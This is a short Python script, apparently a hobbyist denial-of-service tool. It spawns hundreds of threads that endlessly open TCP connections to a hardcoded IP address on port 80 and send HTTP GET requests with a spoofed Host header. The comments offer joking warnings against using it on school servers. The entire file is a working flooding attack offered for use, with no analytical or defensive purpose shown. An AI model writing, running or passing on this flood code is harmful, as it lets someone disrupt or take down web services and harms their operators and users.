#just in case you are using it for eduserver or something please dont

import socket
import threading

target = '192.168.40.22' #dontdoit
port = 80
fake_ip = '182.21.20.32' #host

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target,port))
        s.close()

#threads

n = int(input("No of threads to be used(suggested 500) :"))

for i in range(n):
    thread = threading.Thread(target=attack)
    thread.start()